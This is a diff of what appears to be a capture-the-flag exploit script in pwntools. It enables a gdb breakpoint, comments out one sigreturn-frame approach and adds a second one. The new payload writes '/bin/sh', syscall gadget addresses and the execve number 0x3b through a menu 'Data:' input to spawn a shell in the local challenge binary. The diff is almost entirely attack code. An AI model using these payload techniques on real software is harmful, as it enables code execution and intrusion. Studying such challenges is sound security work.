@@ -5,7 +5,7 @@ p = process(exe.path)
 context.terminal = ['foot']
 gdb.attach(p, gdbscript='''
 
-           # b*0x040113f      
+           b*0x040113f      
            # b*0x040117d      
            # b*0x40123a
            # b*main+287
@@ -69,21 +69,33 @@ p.sendafter(b'>',b'4')
 p.sendafter(b'>',b'4')
 
 
+# way 1 
+# p.sendafter(b'>',b'1')
+# p.sendafter(b'Data:',b'/bin/sh\0')  
+# p.sendafter(b'>',b'1')
+# p.sendafter(b'Data:',b'd'*0x40)               #3
+# p.sendafter(b'>',b'1')
+# p.sendafter(b'Data:', flat(frame)[88+64+64:])               #3
+# p.sendafter(b'>',b'1')
+# p.sendafter(b'Data:', flat(frame)[88+64:-32])
+# p.sendafter(b'>',b'1')
+# p.sendafter(b'Data:',flat(frame)[88:-96] )
+# p.sendafter(b'>',b'1')
+# p.sendafter(b'Data:',flat(frame)[24:-160])
 
+#way 2 
 p.sendafter(b'>',b'1')
 p.sendafter(b'Data:',b'/bin/sh\0')  
 p.sendafter(b'>',b'1')
 p.sendafter(b'Data:',b'd'*0x40)               #3
+p.sendafter(b'>',b'1' )
+p.sendafter(b'Data:',b'\x00')               #3
 p.sendafter(b'>',b'1')
-p.sendafter(b'Data:', flat(frame)[88+64+64:])               #3
+p.sendafter(b'Data:',   p64(0)+ p64(syscall) +p64(syscall) +p64(0) +p64(0x33))
 p.sendafter(b'>',b'1')
-p.sendafter(b'Data:', flat(frame)[88+64:-32])
+p.sendafter(b'Data:',b'\x00'*0x10 + p64(bin_sh) + b'\x00'*0x20 + p64(0x3b))
 p.sendafter(b'>',b'1')
-p.sendafter(b'Data:',flat(frame)[88:-96] )
-p.sendafter(b'>',b'1')
-p.sendafter(b'Data:',flat(frame)[24:-160])
-
-
+p.sendafter(b'Data:', b'\x00')
 
 
 
